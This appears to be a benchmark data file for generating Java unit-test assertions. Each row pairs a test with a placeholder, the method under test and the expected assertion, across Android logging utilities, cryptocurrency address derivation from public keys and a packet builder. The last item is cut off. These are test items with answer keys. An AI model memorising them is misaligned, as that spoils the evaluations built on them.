"testAdapterUpdate() { NetworkTask task = getNetworkTaskDAO().insertNetworkTask(getNetworkTask()); LogEntry logEntry = getLogDAO().insertAndDeleteLog(getLogEntryWithNetworkTaskId(task.getId(), new GregorianCalendar(1980, Calendar.MARCH, 17).getTime().getTime())); LogEntryUISyncTask syncTask = new LogEntryUISyncTask(getActivity(activityScenario), task, getAdapter(activityScenario)); syncTask.runOnUIThread(logEntry); InstrumentationRegistry.getInstrumentation().waitForIdleSync(); LogEntryAdapter adapter = getAdapter(activityScenario); LogEntry adapterLogEntry = adapter.getItem(0); ""<AssertPlaceHolder>""; }
runOnUIThread(LogEntry logEntry) { Log.d(LogEntryUISyncTask.class.getName(), ""runOnUIThread, logEntry is "" + logEntry); if (logEntry == null || adapterRef == null) { return; } LogEntryAdapter adapter = adapterRef.get(); if (adapter != null) { try { Log.d(LogEntryUISyncTask.class.getName(), ""Updating adapter with logEntry"" + logEntry); if (adapter.hasValidEntries()) { adapter.addItem(logEntry); adapter.notifyItemInserted(0); } else { adapter.addItem(logEntry); adapter.notifyItemChanged(0); } } catch (Exception exc) { Log.e(LogEntryUISyncTask.class.getName(), ""Error updating adapter with logEntry "" + logEntry, exc); } } }"	assertTrue(logEntry.isEqual(adapterLogEntry))
"testAdapterUpdateWithEmptyList() { NetworkTask task1 = getNetworkTaskDAO().insertNetworkTask(getNetworkTask1()); NetworkTask task2 = getNetworkTaskDAO().insertNetworkTask(getNetworkTask2()); NetworkTask task3 = getNetworkTaskDAO().insertNetworkTask(getNetworkTask3()); AccessTypeData data1 = getAccessTypeDataDAO().insertAccessTypeData(getAccessTypeData1(task1.getId())); AccessTypeData data2 = getAccessTypeDataDAO().insertAccessTypeData(getAccessTypeData2(task2.getId())); AccessTypeData data3 = getAccessTypeDataDAO().insertAccessTypeData(getAccessTypeData3(task3.getId())); LogEntry logEntry1 = getLogDAO().insertAndDeleteLog(getLogEntryWithNetworkTaskId(task1.getId(), new GregorianCalendar(1980, Calendar.MARCH, 17).getTime().getTime())); LogEntry logEntry2 = getLogDAO().insertAndDeleteLog(getLogEntryWithNetworkTaskId(task2.getId(), new GregorianCalendar(1981, Calendar.MARCH, 17).getTime().getTime())); NetworkTaskUIWrapper wrapper1 = new NetworkTaskUIWrapper(task1, data1, logEntry1); NetworkTaskUIWrapper wrapper2 = new NetworkTaskUIWrapper(task2, data2, logEntry2); NetworkTaskUIWrapper wrapper3 = new NetworkTaskUIWrapper(task3, data3, null); NetworkTaskAdapter adapter = getAdapter(activityScenario); adapter.addItem(wrapper1); adapter.addItem(wrapper2); adapter.addItem(wrapper3); initTask.runOnUIThread(Collections.emptyList()); InstrumentationRegistry.getInstrumentation().waitForIdleSync(); ""<AssertPlaceHolder>""; }
runOnUIThread(List<NetworkTaskUIWrapper> networkTaskUIWrappers) { Log.d(NetworkTaskMainUIInitTask.class.getName(), ""runOnUIThread""); if (networkTaskUIWrappers == null || adapterRef == null) { return; } try { NetworkTaskAdapter adapter = adapterRef.get(); if (adapter != null) { Log.d(NetworkTaskMainUIInitTask.class.getName(), ""Initializing adapter""); adapter.replaceItems(networkTaskUIWrappers); adapter.notifyDataSetChanged(); } } catch (Exception exc) { Log.e(NetworkTaskMainUISyncTask.class.getName(), ""Error initializing adapter"", exc); } }"	assertEquals(0, adapter.getAllItems().size())
"testGetLogFileName() { NetworkTask networkTask = new NetworkTask(); networkTask.setIndex(1); networkTask.setAddress(""127.0.0.1""); networkTask.setSchedulerId(123); ""<AssertPlaceHolder>""; }
getLogFileName(Context context, IFileManager fileManager, NetworkTask networkTask) { String baseFileName = context.getResources().getString(R.string.networktask_file_logger_log_file_base_name_default); String extension = context.getResources().getString(R.string.networktask_file_logger_log_file_base_extension_default); return fileManager.getLogFileName(baseFileName, extension, networkTask.getSchedulerId(), networkTask.getIndex(), networkTask.getAddress()); }"	"assertEquals(""networktask_2_127_0_0_1_id_0000007B.log"", LogUtil.getLogFileName(TestRegistry.getContext(), new SystemFileManager(TestRegistry.getContext()), networkTask))"
"testGetLogFileKey() { NetworkTask networkTask = new NetworkTask(); networkTask.setIndex(1); networkTask.setAddress(""127.0.0.1""); networkTask.setSchedulerId(123); ""<AssertPlaceHolder>""; }
getLogFileKey(Context context, NetworkTask networkTask) { String baseFileName = context.getResources().getString(R.string.networktask_file_logger_log_file_base_name_default); return baseFileName + ""_"" + networkTask.getIndex() + ""_"" + networkTask.getSchedulerId() + ""_"" + networkTask.getAddress(); }"	"assertEquals(""networktask_1_123_127.0.0.1"", LogUtil.getLogFileKey(TestRegistry.getContext(), networkTask))"
"formatLogEntryLog() { LogEntry entry = getLogEntry(); ""<AssertPlaceHolder>""; }
formatLogEntryLog(Context context, int index, LogEntry entry) { String formattedTitleText = context.getResources().getString(R.string.text_activity_log_list_item_log_entry_title, index + 1); String successText = entry.isSuccess() ? context.getResources().getString(R.string.string_successful) : context.getResources().getString(R.string.string_not_successful); String formattedSuccessText = context.getResources().getString(R.string.text_activity_log_list_item_log_entry_success, successText); String timestampText = DateFormat.getDateTimeInstance(DateFormat.MEDIUM, DateFormat.MEDIUM).format(new Date(entry.getTimestamp())); String formattedTimestampText = context.getResources().getString(R.string.text_activity_log_list_item_log_entry_timestamp, timestampText); String formattedMessageText = context.getResources().getString(R.string.text_activity_log_list_item_log_entry_message, entry.getMessage()); return formattedTitleText + "", "" + formattedSuccessText + "", "" + formattedTimestampText + "", "" + formattedMessageText; }"	"assertEquals(""Log entry for network task 2, Execution successful, Timestamp: Jan 1, 1970 1:00:00 AM, Message: TestMessage1"", LogUtil.formatLogEntryLog(TestRegistry.getContext(), 1, entry))"
"Exception { ByteArrayInputStream stream = new ByteArrayInputStream(""Test"".getBytes(Charsets.US_ASCII)); ""<AssertPlaceHolder>""; }
inputStreamToString(InputStream stream, Charset charset) throws Exception { Log.d(StreamUtil.class.getName(), ""inputStreamToString""); byte[] buffer = new byte[BUFFER_SIZE_1024]; StringBuilder stringBuilder = new StringBuilder(); int read; while ((read = stream.read(buffer, 0, BUFFER_SIZE_1024)) >= 0) { String data = new String(buffer, 0, read, charset); stringBuilder.append(data); } return stringBuilder.toString(); }"	"assertEquals(""Test"", StreamUtil.inputStreamToString(stream, Charsets.US_ASCII))"
"Exception { ByteArrayOutputStream stream = new ByteArrayOutputStream(); StreamUtil.stringToOutputStream(""Test"", stream, Charsets.US_ASCII); ""<AssertPlaceHolder>""; }
stringToOutputStream(String data, OutputStream stream, Charset charset) throws Exception { Log.d(StreamUtil.class.getName(), ""stringToFile, data is "" + data); char[] buffer = new char[BUFFER_SIZE_1024]; StringReader reader = new StringReader(data); OutputStreamWriter writer = new OutputStreamWriter(stream, charset); int read; while ((read = reader.read(buffer, 0, BUFFER_SIZE_1024)) >= 0) { writer.write(buffer, 0, read); } writer.flush(); }"	"assertEquals(""Test"", stream.toString(Charsets.US_ASCII.name()))"
"testGetRelativeTimestamp() { Time time = new Time(); time.setHour(17); time.setMinute(59); long timestamp = TimeUtil.getRelativeTimestamp(time); SimpleDateFormat dateFormat = new SimpleDateFormat(""HH:mm""); ""<AssertPlaceHolder>""; }
getRelativeTimestamp(Time time) { Calendar date = getCalendarFromTime(time, 0); return date.getTimeInMillis(); }"	"assertEquals(""17:59"", dateFormat.format(timestamp))"
"testXpub2Pub() { String xpub = ""xpub6D3i46Y43SFfjEBYheBK3btYMRm9Cfb8Tt4M5Bv16tArNBw5ATNyJWjdcMyLxoCdHWTvm3ak7j2BWacq5Lw478aYUeARoYm4dvaQgJBAGsb""; String pub = Util.pubKeyFromExtentPubKey(xpub); ""<AssertPlaceHolder>""; }
pubKeyFromExtentPubKey(String extendPubKey) { DeterministicKey key = DeterministicKey.deserializeB58(extendPubKey, MainNetParams.get()); return Hex.toHexString(key.getPubKey()); }"	"assertEquals(pub,""0239c284493a8bf05e0723f001634fac452f6289e20c496f9bfcbf83917972f3b8"")"
"deriveAddress() { String[] addr = new String[] { ""3Kd5rjiLtvpHv5nhYQNTTeRLgrz4om32PJ"", ""352BwoAuZWavjSDgAUUCnbg6a2v3FEzbMn"", ""32Hhx9CM3gYwChY2ZRFtHTYpJCeUaoypkj"", ""3C5VmDeH3x6x9fPm4cft3qVhzvv8R4Ln7K"", ""38c8FFS9W4QEW55WXgo2wX8HZJCutH89VT"", ""3EWeeC2wPyTAsPG7rTRbczbFjvZ8nW41AZ"", ""35yk3RdCHQYptsZAmibMpUt6F9XkK7UVCm"", ""32sNjcbmj4hqthuP6hsQk3BjzVLFLZSLr8"", ""34dKWKb347TJwp1PysTt5faqSs9C1PXrVX"", ""3AzuY1VfwKBgAN3soFnm8BNNAJxx4S3Y7L"", ""3CAgK3r8nDiMcdnqBUL3Yy7JMFDjvkXqHn"" }; String pubKey = ""xpub6D3i46Y43SFfjEBYheBK3btYMRm9Cfb8Tt4M5Bv16tArNBw5ATNyJWjdcMyLxoCdHWTvm3ak7j2BWacq5Lw478aYUeARoYm4dvaQgJBAGsb""; for (int i = 0 ; i < addr.length; i++) { String address = new Btc.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String accountXpub, int changeIndex, int addressIndex) { DeterministicKey address = getAddrDeterministicKey(accountXpub, changeIndex, addressIndex); LegacyAddress addr = LegacyAddress.fromScriptHash(MAINNET, segWitOutputScript(address.getPubKeyHash()).getPubKeyHash()); return addr.toBase58(); }"	assertEquals(address,addr[i])
"deriveAddress() { String[] addr = new String[] { ""0x1a87af7a97b0fdbe20e0876558242080224df8d9"", ""0x1350b1fff9a39d39868ad2686ab377c3386d1e47"", ""0x1715c549840850accfa03d058bda9348eccafba8"", ""0x134f50b7dc9813a242b86be886d855a1205011fe"", ""0x14b4f3cb87a423374c68699cd4d8871b4857373b"", ""0x15910cd35bdf40371963bd0f67014fdd7d31d104"", ""0x178fa053c1c4c1794316b1cd77aa8f74ac9d2aa8"", ""0x1024b67c023238f30fcf2f19992b2181c7f37299"", ""0x1c1add082549c318b46135446d17a8780615fc68"", ""0x1016021afacffea09ef16305575bba3a611326e2"", ""0x1482c0095627945ef8358bec575aa1a408dbb4f2"", }; String pubKey = ""xpub6BfuP8AaZEqdkesFsnYKR3XrmiLM3ovccFMKnrGoTfL3EY7x2LTDFChFPEY9aixnrgWmLDLJUxQ57dFmiYH2g6PVWPX2boBTQ7PhUu8ARUb""; for (int i = 0 ; i < addr.length; i++) { String address = new Cfx.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String accountXpub, int changeIndex, int addrIndex) { DeterministicKey address = getAddrDeterministicKey(accountXpub, changeIndex, addrIndex); //decompress ECKey eckey = ECKey.fromPublicOnly(address.getPubKeyPoint(), address.isCompressed()); byte[] pubKey = eckey.decompress().getPubKey(); byte[] hash = new byte[pubKey.length - 1]; System.arraycopy(pubKey, 1, hash, 0, hash.length);  String s = Hex.toHexString(getAddress(hash)); return convertToBase32Address(s); }"	assertEquals(address,addr[i])
"deriveAddress() { String[] addr = new String[] { ""XciiKrSHgdFkuL9FTT31qRfTPNUVxX4sPc"", ""XgTmuNhRLoj4F75TqboUgZQVQ37HCgW9Hf"", ""Xpj2zS65KN6r792TQKuAMeJpLMdknrjo1y"", ""Xb9LAffWjcxTCN5GMj5kbZiqN5g7nnkgrv"", ""XyAT2tRaXhdZ4JvvB44Jy9S4qd6JurzaVo"", ""XntqLKJvZbkauFvGLWHsGNMh51K5eiHvHT"", ""XuMqWDM3eabLrze4hnLDtwvzBfQVSNjdqk"", ""Xj3Q7zDq3BYmiPNHrwMgtPNgSKYQyQTs97"", ""XmWeKAdw3DPcFvRFhro8brzhpqPoxvGdny"", ""XfYy4fYEXa6ikpfzsSZS537yjoN3Mhstsv"", ""XyuGNJoxmUiA1unZ7JKiG2g5WS69sDKFBP"", }; String pubKey = ""xpub6DTnbXgbPo6mrRhgim9sg7Jp571onenuioxgfSDJEREH7wudyDQMDSoTdLQiYq3tbvZVkzcPe7nMgL7mbSixQQcShekfhKt3Wdx6dE8MHCk""; for (int i = 0 ; i < addr.length; i++) { String address = new Dash.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String xPubKey, int changeIndex, int addrIndex) { DeterministicKey address = getAddrDeterministicKey(xPubKey, changeIndex, addrIndex); return Base58.encodeChecked(0x4c, address.getPubKeyHash()); }"	assertEquals(address,addr[i])
"deriveAddress() { String[] addr = new String[] { ""DsYvV7Q6ymU2WFzBFdVzNyUk7UXAE2dVyYd"", ""DsbTLcGY9NHNqVvQZrJyXLcLN76SVrzBodq"", ""DsTznosWuFjz94pjTKoAaEWd8LUVdCYfBfc"", ""DsWzdC3CtWPy5ZqY7pTQH35Gm5JhH9mMe2c"", ""DsbWz3eYSPRJk8DnehixbaDAXcVhUdz4p9u"", ""DsmpowTXxpUxYwtwHgSHoixsCBcJ4gZZCZ7"", ""Dsf2hAR1ZainZdRFY4fWi1ZM6vPJevsuXfn"", ""DsSHLUANtfo82zVyLiTgi6SWQZdgSXAYrAc"", ""Dsa76GyVEETpToSvWATPUtiXSpPbNmQHwg1"", ""DsiC8hxMC2ApnouYUwMK1L4c3wbHezq5Gwb"", ""DsgKnFzMq6kz4JWYWfaywo3LNhMBhJZZsDS"", }; String pubKey = ""xpub6BmQYH48mM1hm8B2TDXg7oDfa7dZfHVgi7pWFMsmSuJ3rVwi2YEgjZMN1cBFQtieHPgmoY3YQx5G85XyxMvppPxJToxmWjo64gaNutTn6iw""; for (int i = 0 ; i < addr.length; i++) { String address = new Dcr.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String xPubKey, int changeIndex, int addrIndex) { DeterministicKey address = getAddrDeterministicKey(xPubKey, changeIndex, addrIndex); byte[] hash = blake256Ripemd160(address.getPubKey()); return encodeChecked(hash); }"	assertEquals(address,addr[i])
"testEncodeAddress() { String expub = ""xpub69XF3sp9ePvENHmDenwg9humjwqtKuZbZ8go4p8qTpQWn1SFzXTT8DhMtPX66T6sPpaZjtdQrB7cqu3mcrn7Dch85GVrc9grt3n3AvC9BVb""; System.out.println(Hex.toHexString(Base58.decode(""16iM7BVPSvuJnjMW5T7rGWv4PTvgybD5sUS1zZyQkEf7DMHY""))); String addr = new Dot.Deriver().derive(expub); ""<AssertPlaceHolder>""; System.out.println(AddressCodec.encodeAddress(Hex.decode(""b27c9706a72d4642c407cad42d8c6c4d45a736902487c0d3ff602ac14ffa5e31""), (byte) 0)); }
derive(String xPubKey) { byte[] bytes = new B58().decode(xPubKey); byte[] pubKey = Arrays.copyOfRange(bytes,bytes.length - 4 - 32,bytes.length - 4); return AddressCodec.encodeAddress(pubKey, prefix); }"	"assertEquals(""1vQAnWwUYeEnoF1yK51ZmHpaVRs6inHHEJhzJto3xgqe4pF"", addr)"
"ElectrumTx.SerializationException { String hex = ""45505446ff00020000000001019c27c79ffc9ea5773030e2f31c7f4852fdec0a9d5d56bfd96bd5635faa9da1050000000017160014926abdcbe75e28d62ba442d0f2033eded710bd91fdffffff02b30b00000000000017a914f2c0b14d07c5ac95185487ba27d4256d8e83e76887102700000000000017a914460effb9083c27112687e637a29f0893e110615d87feffffffff4d3700000000000000000201ff53ff049d7cb203e0a197408000000043e91b2cfe457819db8a86101dbf60f9310cd3d95dafb7f4dc9fc3d816bb6c8a0276f4cca4bd18335cc482cf0c6dce442ecdb9eeda4ef8909e0c8beec6a35d416c00000900a09a0900""; ElectrumTx electrumTx = ElectrumTx.parse(Hex.decode(hex)); ""<AssertPlaceHolder>""; }
parse(byte[] rawElectrumTx) throws SerializationException { int offset = 0; int length = rawElectrumTx.length; ByteArrayInputStream rawTxStream = new ByteArrayInputStream(rawElectrumTx); byte[] magicPrefix = new byte[5]; offset += rawTxStream.read(magicPrefix, 0, 5); boolean partial = PARTIAL_TXN_HEADER_MAGIC.equals(Hex.toHexString(magicPrefix)); byte[] formatVersion = new byte[1]; offset += rawTxStream.read(formatVersion, 0, 1);   if (formatVersion[0] != PARTIAL_FORMAT_VERSION) { throw new SerializationException(""format version is not supported""); }  int txLength = length - offset;  byte[] txPlayLoad = new byte[txLength];  rawTxStream.read(txPlayLoad, 0, txLength);  Message txMessage = new Message(txPlayLoad); long version = txMessage.readUint32(); byte marker = txMessage.payload[txMessage.cursor]; boolean useSegwit = marker == 0; if (useSegwit) { txMessage.readBytes(2); } ElectrumTx tx = new ElectrumTx(version, partial, useSegwit); tx.parseInput(txMessage); tx.parseOutput(txMessage);  for(int i =0; i < tx.inputs.size(); i++) { parseWitness(txMessage, tx.inputs.get(i)); } tx.lockTime = txMessage.readUint32(); return tx; }"	"assertTrue(TxUtils.isMasterPublicKeyMatch(""xpub6DJXnFtECztcYS2Gm5pyPpbbxuqMJ7BvqBtrTH1ZBjXraQJAgnHsgzBn9Q6HvXieoT7TNb1ynkyWmQDF64GCaybUYnXhof7McNZhfmFRgp3"",electrumTx))"
"deriveAddress() { String pubKey = ""xpub6BffWuUvhRpycrEq9H2gQDNT1xtzu2pfNvaf2j6JMxErTFbwAX7yaL5hCocYJwaKxmYgpNuoXkGFKHQv2brE1XEmX1aneH3AHtUrR8tMV6H""; String address = new Eos.Deriver().derive(pubKey,0,0);  ""<AssertPlaceHolder>""; }
derive(String accountXpub, int changeIndex, int addressIndex) { DeterministicKey address = getAddrDeterministicKey(accountXpub, 0, 0);  return getEosPubKey(address); }"	"assertEquals(address,""EOS86B1XBB2B7u3QcdM5tuuTdRMLFfVDzsTcjHvDqcFq78MSstUxp"")"
"deriveAddress() { String[] addr = new String[] { ""0xE410157345be56688F43FF0D9e4B2B38Ea8F7828"", ""0xEEACb7a5e53600c144C0b9839A834bb4b39E540c"", ""0xA116800A72e56f91cF1677D40C9984f9C9f4B2c7"", ""0x4826BadaBC9894B3513e23Be408605611b236C0f"", ""0x8a1503beb17Ef02cC4Ff288b0A73583c4ce547c7"", ""0x996c7a5c9001da0401B61aD68EFd2424633F728E"", ""0xcAC3561d0b4Bec860ADCEBD70f8E6a8A5D45D752"", ""0x7173684414e3a9d5347e5d73b1E8718f3020A296"", ""0x4AAb5aD4FF70D7388182068a0B74BEEBA28B5068"", ""0x824C70B0000Abf51F6db46284dC217579f53f86a"", ""0x56FA9453B22867E0292301b68C2A737D8879441B"", }; String pubKey = ""xpub6CNhtuXAHDs84AhZj5ALZB6ii4sP5LnDXaKDSjiy6kcBbiysq89cDrLG29poKvZtX9z4FchZKTjTyiPuDeiFMUd1H4g5zViQxt4tpkronJr""; for (int i = 0 ; i < addr.length; i++) { String address = new Eth.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String accountXpub, int changeIndex, int addrIndex) { DeterministicKey address = getAddrDeterministicKey(accountXpub, changeIndex, addrIndex); //decompress ECKey eckey = ECKey.fromPublicOnly(address.getPubKeyPoint(), address.isCompressed()); byte[] pubKey = eckey.decompress().getPubKey(); byte[] hash = new byte[pubKey.length - 1]; System.arraycopy(pubKey, 1, hash, 0, hash.length);  String s = Hex.toHexString(getAddress(hash));  //checksum return toChecksumAddress(s); }"	assertEquals(address,addr[i])
"IOException { ClassLoader classLoader = this.getClass().getClassLoader(); URL resource = classLoader.getResource(""test.json""); File f = new File(resource.getPath()); String s = readString(f); StructuredDataEncoder structuredData = new StructuredDataEncoder(s); byte[] msgHash = structuredData.hashStructuredData(); String ownerAddress = ""0xE10AA6471B33845FaE88DD7bBeB63c250DA3a639""; String sig = ""4f4e0dec5f1d6f99460fea04bc374d96a495d96c0c455d4731902cdbf95525fc77c66ee08346466fe188f521c196f0f06bebb8d1a8df44cb68792514ca24808e2a""; byte[] signatureBytes = Hex.decode(sig); byte v = signatureBytes[64]; Sign.SignatureData sd = new Sign.SignatureData( v, Arrays.copyOfRange(signatureBytes, 0, 32), Arrays.copyOfRange(signatureBytes, 32, 64));  boolean verified = false; for (int i = 0; i < 4; i++) { BigInteger publicKey = Sign.recoverFromSignature( (byte) i, new ECDSASignature( new BigInteger(1, sd.getR()), new BigInteger(1, sd.getS())), msgHash);  if (publicKey != null) { String addressRecovered = Keys.toChecksumAddress(Keys.getAddress(publicKey)); if (addressRecovered.equals(ownerAddress)) { verified = true; break; } } } ""<AssertPlaceHolder>""; }
getAddress(byte[] publicKey) { byte[] hash = new Keccak.Digest256().digest(publicKey); return Arrays.copyOfRange(hash, hash.length - 20, hash.length);  // right most 160 bits }"	assertTrue(verified)
"deriveAddress() { String[] addr = new String[] { ""aJtu4Ztv64yCUZYm9YzQ7b3Hyrii2foaj8"", ""aJJvE5kRvBJXJWeBcxScAf2ABr4vZVCotp"", ""aGQC2rasPV2tiJnFJTqbevAniozqZDPpcA"", ""a6pzbbDbqgCbKupySGuVWX2QewCGcSNFac"", ""a3fY53SF4CdKeWAwMcUMQMjf7Y9b9tcxqS"", ""aAFzem9L6FTT6peetFMoinJVeaCE2YZWDR"", ""aNZUbMNuKEKxNSKvXCdNHt8kUTZoRQ8PM2"", ""a6sFxJEsvwFvKCdaxhjGf1LSWYHTAfBwEE"", ""aGcTa2jiSkyFLVGsLjtJZG5kCYxtWbbUhB"", ""a2gcBybNBzDqsbAU5S78ug8GUKrnm1STwS"", ""aBCFtxBN915aLPYbCADQULzUv4qYiXNW3X"", }; String pubKey = ""xpub6CKMZBhyfgYMeK7UuVCwF56BXsm1kVbUQwmB7bDU2i2cGx2VXNwR7Z5tnGsuZbjc35LQvhyZJasrX12adMdAqtFno9fLJJxSksPDU7W3SEk""; for (int i = 0 ; i < addr.length; i++) { String address = new Firo.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String xPubKey, int changeIndex, int addrIndex) { DeterministicKey address = getAddrDeterministicKey(xPubKey, changeIndex, addrIndex); return Base58.encodeChecked(0x52, address.getPubKeyHash()); }"	assertEquals(address,addr[i])
"deriveAddress() { String pubKey = ""xpub6GhXKqoStzyfom3kNWLzMFhLzir4GgPXnzwYMwurCWizsq2yXvZRHJJBny1hzA1YsepvGC9L3dSYPDY3wkuahqDsbK36cHKY4LMtV8DnARm""; String address = new Iost.Deriver().derive(pubKey);  ""<AssertPlaceHolder>""; }
derive(String xPubKey) { byte[] bytes = new B58().decode(xPubKey); byte[] pubKey = Arrays.copyOfRange(bytes,bytes.length - 4 - 32,bytes.length - 4); return new B58().encodeToString(pubKey); }"	"assertEquals(address,""4guFd1weqq2Nvfxt6EDSfztUjp44trRzfJMqXumJ3qRt"")"
"deriveAddress() { String[] addr = new String[] { ""TYgXziK4zH4T5dchXFBseTFUpZ8kty6oQy"", ""TTgPTW6oaxmRnKz1xFT2qSHx3QNEpP2jZ6"", ""TWD5uP9gDo9QJcYhvoN4u4jS4b9pHV25ow"", ""TTrMEb1R2iUba67yygVVzu8ny6F1R3NbaE"", ""TAGkxJfAd5Xy4D6PL76HAH4WM9W7VVpCDf"", ""TGAnfDpv8GhTmi2WXbvQG7LPGguX5cuMcG"", ""TXSEwZGP5JDZmU9z75SHBMY1GsB7HCjWyD"", ""TB2ibqfKPNxHEqQHHmVUPfVgNGEtXkJ8NL"", ""TSbt9gkbJriTUXmUxgVBLxNFwWwx6e4qTw"", ""TNLvDnx9jECDPTRq31KaxPkMX4zaMLQeVC"", ""TSzi8byHgnEbiHo8h4X5rkcmFXxM3wpZqH"", }; String pubKey = ""xpub6BmQYH48mM1hm8B2TDXg7oDfa7dZfHVgi7pWFMsmSuJ3rVwi2YEgjZMN1cBFQtieHPgmoY3YQx5G85XyxMvppPxJToxmWjo64gaNutTn6iw""; for (int i = 0 ; i < addr.length; i++) { String address = new Tron.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String accountXpub, int changeIndex, int addrIndex) {  DeterministicKey address = getAddrDeterministicKey(accountXpub, changeIndex, addrIndex);  ECKey eckey = ECKey.fromPublicOnly(address.getPubKeyPoint(), address.isCompressed()); byte[] pubKey = eckey.decompress().getPubKey(); byte[] hash = new byte[pubKey.length - 1]; System.arraycopy(pubKey, 1, hash, 0, hash.length);  byte[] addr = getAddress(hash);  return Base58.encodeChecked(0x41, addr); }"	assertEquals(address,addr[i])
"deriveAddress() { String[] addr = new String[] { ""rndm7RphBZG6CpZvKcG9AjoFbSvcKhwLCx"", ""rrBD4sBsxrpzbohAEYWH4moPSsoxupWLA"", ""rsc38kSbRZ74VjiNa8CG8xtkdqw2AWaXBb"", ""r4Mh3Hdvk1UJJSs8tjkz9qnbxNyMD5qhYz"", ""rsR6GtwgEtcJRaMrW2cNx8nwNqFovnJ32C"", ""rhzrij6yt1wCwRAFgQK5VqxyxyhbNw7QR9"", ""rNLCXobmiL4LbQkbjFJCWSW6XQm8XDLoCq"", ""rKaNnXijwXQhyWegPkmUYchJzAxgKQjry9"", ""rJ1gcRd2w38wwFNdSiqqVEuf4jYHU1fpP1"", ""rE8fnyfbtdwkbumCm3aRR5dWcTHvS6pnWt"", ""rLJYeuBpLdo6CY3xhc3SWt7hzYS6votewa"", }; String pubKey = ""xpub6C438jHkPCDoEy5jAH4a9hBtYrcprSwGvEA8L5HNhqDyJa1WZPpZXj9DNNtsRjcHxzsuZJq18sMSkbmqYKqpDacP8aMSK63ExzX2bPoMdAo""; for (int i = 0 ; i < addr.length; i++) { String address = new Xrp.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String xPubKey, int changeIndex, int addrIndex) { DeterministicKey address = getAddrDeterministicKey(xPubKey, changeIndex, addrIndex); System.out.println(Hex.toHexString(address.getPubKey())); return new B58(DEFAULT_ALPHABET).encodeToStringChecked(address.getPubKeyHash(), 0); }"	assertEquals(address,addr[i])
"deriveAddress() { String[] addr = new String[] { ""2N15bQ1KCcH4NhcTxytfYDREiKmCiigaA5f"", ""2MxWT6eEmjnhyzGjo5q9qppCF4e6ng9eNqc"", ""2MyR2Fmpdw4orTpSfPDPQSFhvJMcrATBnrW"", ""2MzqZNaSsNbgCmGFLfyHCqVvHXXBNvC9rTJ"", ""2Mx6byBJtxiungkVvX4uyGy6TQ4uBmA73V7"", ""2N14sRRuAA45s3HnD9UjGHMt4CsFvrSXpLW"", ""2N1cqmw8FRvJS72YWmrkqxRZHu74QJiv2nu"", ""2Mw2UemiDkkTeKCH5DsbJJgL8wqLk5JMReV"", ""2MznBcVXhpab4vQT9e7jZSBVC1W5VZeC4tJ"", ""2N4KPNKGBGxhQzYFhejLJgHsNKHBmjmucfJ"", }; String pubKey = ""xpub6CT8ayCfq1XAk9fbrfwVTc92DLhsr1bpzxQnX97ixZgSJqhYEdaYx1As3RT6rwEiUgRxCg8PYvg58Waz3wvVDnPZ9aMf9AdCnf6nowJftd8""; for (int i = 0 ; i < addr.length; i++) { String address = new Xtn.Deriver().derive(pubKey,0,i); ""<AssertPlaceHolder>""; } }
derive(String xPubKey, int changeIndex, int addrIndex) { DeterministicKey address = getAddrDeterministicKey(xPubKey, changeIndex, addrIndex);  LegacyAddress addr = LegacyAddress.fromScriptHash(REGTEST, segWitOutputScript(address.getPubKeyHash()).getPubKeyHash()); return Base58.encodeChecked(0xc4, addr.getHash()); }"	assertEquals(address,addr[i])
"getId() { ""<AssertPlaceHolder>""; }
getId() { return id; }"	assertEquals(0x01, new Packet.Builder(0x01).build().getId())
"getPayload() { ""<AssertPlaceHolder>""; }
getPayload(int payloadId) { return payloads.get(payloadId, null); }"	assertNull(new Packet.Builder(0x00) .addBytePayload(0x01, 0x02) .build() .getPayload(0x00) )
"getPayload2() { ""<AssertPlaceHolder>""; }
getPayload(int payloadId) { return payloads.get(payloadId, null); }"	assertEquals(0x02, new Packet.Builder(0x00) .addBytePayload(0x01, 0x02) .build() .getPayload(0x01) .toInt())
"getPayload3() { ""<AssertPlaceHolder>""; }
getPayload(int payloadId) { return payloads.get(payloadId, null); }"	assertEquals(0xEFFE, new Packet.Builder(0x00) .addShortPayload(0x01, 0xEFFE) .build() .getPayload(0x01) .toInt() )
"getPayload4() { ""<AssertPlaceHolder>""; }
getPayload(int payloadId) { return payloads.get(payloadId, null); }"	assertEquals(0x01020304, new Packet.Builder(0x00) .addIntPayload(0x01, 0x01020304) .build() .getPayload(0x01) .toInt() )
"getPayload5() { ""<AssertPlaceHolder>""; }
getPayload(int payloadId) { return payloads.get(payloadId, null); }"	assertArrayEquals(new byte[]{0x01, 0x02, 0x03, 0x04}, new Packet.Builder(0x00) .addBytesPayload(0x01, new byte[]{0x01, 0x02, 0x03, 0x04}) .build() .getPayload(0x01) .getValue() )
"getPayload6() { ""<AssertPlaceHolder>""; }
getPayload(int payloadId) { return payloads.get(payloadId, null); }"	"assertEquals(""04030201"", new Packet.Builder(0x00) .addHexPayload(0x01, ""04030201"") .build() .getPayload(0x01) .toHex() )"
"getPayload7() { ""<AssertPlaceHolder>""; }
getPayload(int payloadId) { return payloads.get(payloadId, null); }"	"assertEquals(""hello world"", new Packet.Builder(0x00) .addTextPayload(0x01, ""hello world"") .build() .getPayload(0x01) .toUtf8() )"
"getPayloads() { ""<AssertPlaceHolder>""; }
getPayloads() { return payloads; }"	assertEquals(new Payload(new byte[]{0x01, (byte) 0xFE}), new Packet.Builder(0x00) .addShortPayload(0x01, 0x01FE) .build() .getPayloads() .valueAt(0))
"toInt() { ""<AssertPlaceHolder>""; }
toInt() { if (value.length == 1) { return value[0] & 0xFF; } else if (value.length == 2) { return ByteFormatter.bytes2short(value); } else if (value.length == 4) { return ByteFormatter.bytes2int(value); } else { throw new ByteFormatException(""the length of values must be [one, two, four]""); } }"	assertEquals(0x01010101, new Payload(new byte[]{0x01, 0x01, 0x01, 0x01}).toInt())
"toInt4() { ""<AssertPlaceHolder>""; }
